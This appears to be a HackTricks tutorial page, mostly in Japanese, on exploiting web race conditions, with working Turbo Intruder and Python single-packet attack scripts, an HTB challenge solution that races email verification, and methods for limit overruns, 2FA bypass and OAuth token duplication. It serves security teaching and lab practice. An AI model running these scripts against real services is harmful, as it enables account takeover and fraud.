# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> この手法を深く理解するには、元のレポートを[https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)で確認してください

## Race Condition 攻撃の強化

race condition を利用する際の主な障害は、複数のリクエストがほぼ同時に処理されるようにすることで、処理時間の差が**非常に小さいこと ― 理想的には1ms未満**であることを保証する点です。

ここではリクエストを同期させるためのいくつかの手法を紹介します:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: 単一のTCP接続上で2つのリクエストを送ることができ、ネットワークのジッタの影響を低減します。ただし、サーバー側の差異により、常にrace conditionを再現するには2つのリクエストだけでは不十分なことがあります。
- **HTTP/1.1 'Last-Byte Sync'**: 20〜30のリクエストのほとんどの部分を事前送信し、小さな断片だけを保留にしておき、それらを同時に送信することで、サーバー側で同時到着を実現します。

**Preparation for Last-Byte Sync** involves:

1. ヘッダと本文データから最後のバイトを除いた部分を送信し、ストリームを終了しない。
2. 初回送信後に100ms待機する。
3. 最終フレームのバッチ化のために TCP_NODELAY を無効にして Nagle's algorithm を利用する。
4. 接続をウォームアップするために ping を送る。

保留していたフレームをその後送信すると、それらが単一パケットで到着するはずで、Wireshark で確認できます。この手法は通常 RC 攻撃に関与しない static files には適用できません。

### サーバーアーキテクチャへの適応

ターゲットのアーキテクチャを理解することが重要です。Front-end servers はリクエストを異なる経路でルーティングする可能性があり、タイミングに影響を与えます。意味のないリクエストでサーバー側の接続を事前にウォームアップしておくことで、リクエストのタイミングが均一化される場合があります。

#### Session-Based Locking の扱い

PHP の session handler のようなフレームワークは、セッション単位でリクエストをシリアライズするため、脆弱性が隠れることがあります。各リクエストで異なる session tokens を使うことでこの問題を回避できます。

#### レートやリソース制限の克服

接続のウォームアップが効果を発揮しない場合、ダミーリクエストを大量に送って web servers のレートやリソース制限による遅延を意図的に誘発させることで、single-packet attack を実行しやすいサーバー側の遅延を生み出せる場合があります。

## Attack Examples

- **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)**: You can send the request to **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), you can change in the request the value you want to brute force for **`%s`** like in `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` and then select the **`examples/race-single-packer-attack.py`** from the drop down:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

If you are going to **send different values**, you could modify the code with this one that uses a wordlist from the clipboard:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> ウェブが HTTP2 をサポートしておらず（HTTP1.1 のみ）場合は、`Engine.BURP2` の代わりに `Engine.THREADED` または `Engine.BURP` を使用してください。

- **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: 1 endpoint にリクエストを送り、その後他の複数の endpoint にリクエストを送って RCE をトリガーする必要がある場合、`race-single-packet-attack.py` スクリプトを次のように変更できます:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- **Repeater** でも、Burp Suite の新しい '**Send group in parallel**' オプションから利用できます。
- **limit-overrun** の場合、グループに **same request 50 times** を追加するだけでよいです。
- **connection warming** の場合、**group** の **beginning** にウェブサーバーの非静的な部分へ向けた **requests** をいくつか **add** することができます。
- 2 サブステートのステップで、ある **request** の処理と次の **request** の処理の **between** に処理を **delaying** したい場合は、両方の **requests** の間に追加の **requests** を **add extra requests between** してください。
- **multi-endpoint** RC の場合、まず **goes to the hidden state** する **request** を送り、その直後に **exploits the hidden state** する **50 requests** を続けて送信できます。

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: このスクリプトの目的は、ユーザーのメールアドレスを変更しつつ、その検証が完了するまで継続的に確認することです。新しいメールの検証トークンが最後のメールアドレスに届くまで待ちます（これはコード内で、メールを変更できるが検証が古いメールに送られてしまう RC が確認されたためで、メールを示す変数が最初の値で既に設定されていたからです）。\
受信したメールの中に "objetivo" という単語が見つかったら、変更したメールの検証トークンを受け取ったことが確認できるので、攻撃を終了します。
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Single Packet Attack の改善

オリジナルの研究では、この攻撃は1,500バイトの制限があると説明されています。しかし、[**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)では、IPレイヤのフラグメンテーション（単一のパケットを複数のIPパケットに分割）を使用し、パケットを別順序で送信することで、single packet attack の1,500バイトの制限をTCPの**65,535 Bウィンドウ制限**まで拡張できる方法が説明されています。これにより、すべてのフラグメントがサーバに届くまでパケットの再構成を防ぐことができます。この手法により、研究者は約166msで10,000件のリクエストを送信できました。

この改善により、数百〜数千のパケットが同時に到着することを要求するRCにおいて攻撃の信頼性は向上しますが、ソフトウェア側の制約もあります。Apache、Nginx、Go のような一般的なHTTPサーバーは `SETTINGS_MAX_CONCURRENT_STREAMS` がそれぞれ100、128、250 に厳格に設定されています。一方、NodeJS や nghttp2 のようなものは無制限です。\
これは基本的に Apache が単一のTCP接続からのHTTP接続を100件しか扱わないことを意味し（このRC攻撃を制限します）。

この手法を使ったいくつかの例はリポジトリ https://github.com/Ry0taK/first-sequence-sync/tree/main で確認できます。

## Raw BF

前述の研究以前は、RCを引き起こすためにパケットを可能な限り高速で送信しようとする以下のようなペイロードが使用されていました。

- **Repeater:** 前のセクションの例を参照してください。
- **Intruder**: **request**を**Intruder**に送信し、**Options menu**内で**number of threads**を**30**に設定し、ペイロードとして**Null payloads**を選択して**30**を生成します。
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodology**

### Limit-overrun / TOCTOU

これは、アクションの実行回数を制限する場所に**vulnerabilities**が**appear**する、最も基本的なタイプのrace conditionです。例えば、同じ割引コードをウェブストアで何度も使うことが挙げられます。簡単な例は[**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43)や[**this bug**](https://hackerone.com/reports/759247)**.**

There are many variations of this kind of attack, including:

- Redeeming a gift card multiple times
- Rating a product multiple times
- Withdrawing or transferring cash in excess of your account balance
- Reusing a single CAPTCHA solution
- Bypassing an anti-brute-force rate limit

### **Hidden substates**

複雑な race condition を悪用する際は、短い機会を利用して hidden または **unintended machine substates** とやり取りすることを狙うことが多いです。アプローチ方法は以下の通りです:

1. **Identify Potential Hidden Substates**
- まず、user profiles や password reset のような重要なデータを変更・操作する endpoints を特定します。注目点:
- **Storage**: client-side を扱うものよりも server-side の永続データを操作する endpoints を優先する。
- **Action**: 既存データを変更する操作を探す。新規データを追加する操作より exploitable conditions を生みやすい。
- **Keying**: 成功する攻撃は通常、同じ識別子（例: username や reset token）でキー付けされた操作が関係する。
2. **Conduct Initial Probing**
- 特定した endpoints に対して race condition 攻撃でテストし、期待される結果からの逸脱を観察する。予期しないレスポンスやアプリ挙動の変化は vulnerability の兆候となる。
3. **Demonstrate the Vulnerability**
- 攻撃を最小のリクエスト数（多くの場合 2 回）に絞って vulnerability を実証する。正確なタイミングが必要なため、この段階では複数回の試行や自動化が必要になることがある。

### Time Sensitive Attacks

リクエストのタイミングを精密に合わせることで vulnerabilities が露呈することがある。特に timestamps のような予測可能な手法で security tokens を生成している場合に顕著である。例えば、timestamp ベースで password reset tokens を生成していると、同時に行ったリクエストで同一の token が生成される可能性がある。

**To Exploit:**

- 精密なタイミング（単一パケット攻撃など）で同時に password reset リクエストを送る。同一の token が返れば vulnerability を示す。

**Example:**

- 同時に 2 つの password reset token を要求して比較する。一致すれば token 生成の欠陥を示唆する。

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **to try this.**

## Hidden substates case studies

### Pay & add an Item

この挙動（store で **pay** して支払い不要の**追加アイテム**を**add**する方法）は[**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation)で確認できます。

### Confirm other emails

狙いは、**同時に email address を verify しつつ別のものに change して、プラットフォームが新しいアドレスを確認するかどうかを確かめる**ことです。

### Change email to 2 emails addresses Cookie based

According to [**this research**](https://portswigger.net/research/smashing-the-state-machine) Gitlab was vulnerable to a takeover this way because it might **send** the **email verification token of one email to the other email**.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **to try this.**

### Hidden Database states / Confirmation Bypass

もし **2 different writes** が **database** 内に **information** を **add** するために使われると、database に **only the first data has been written** 短い時間帯が生じる。例えば、ユーザ作成時に **username** と **password** が **written** され、その後に新規アカウントを確認する **token** が書き込まれる、という順序だと、その間は **token to confirm an account is null** という状態になる。

Therefore **registering an account and sending several requests with an empty token** (`token=` or `token[]=` or any other variation) to confirm the account right away could allow to c**onfirm an account** where you don't control the email.

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **to try this.**

### Bypass 2FA

The following pseudo-code is vulnerable to race condition because in a very small time the **2FA is not enforced** while the session is created:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 の永続的な保持

There are several [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). これらのサービスではアプリケーションを作成し、プロバイダに登録されているユーザーを認証することができます。  
そのために、**client** は **あなたのアプリケーションを許可**して、**OAUth provider** 内のデータの一部へアクセスできるようにする必要があります。\
ここまでは google/linkedin/github... 等でよくある一般的なログインで、次のようなページが表示されます："_Application \<InsertCoolName> wants to access you information, do you want to allow it?_"

#### Race Condition in `authorization_code`

The **problem** appears when you **accept it** and automatically sends an **`authorization_code`** to the malicious application. Then, this **application abuses a Race Condition in the OAUth service provider to generate more that one AT/RT** (_Authentication Token/Refresh Token_) from the **`authorization_code`** for your account. 基本的には、あなたがアプリケーションにデータへのアクセスを許可した事実を悪用して **複数のアカウントを作成** します。 その後、もしアプリケーションへのアクセス許可を取り消しても、1組の AT/RT は削除されるかもしれませんが、他のものは依然として有効なまま残ります。

#### Race Condition in `Refresh Token`

Once you have **obtained a valid RT** you could try to **abuse it to generate several AT/RT** and **even if the user cancels the permissions** for the malicious application to access his data, **several RTs will still be valid.**

## **RC in WebSockets**

- In [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) you can find a PoC in Java to send websocket messages in **parallel** to abuse **Race Conditions also in Web Sockets**.
- With Burp’s WebSocket Turbo Intruder you can use the **THREADED** engine to spawn multiple WS connections and fire payloads in parallel. Start from the official example and tune `config()` (thread count) for concurrency; this is often more reliable than batching on a single connection when racing server‑side state across WS handlers. See [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## References

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)

{{#include ../banners/hacktricks-training.md}}
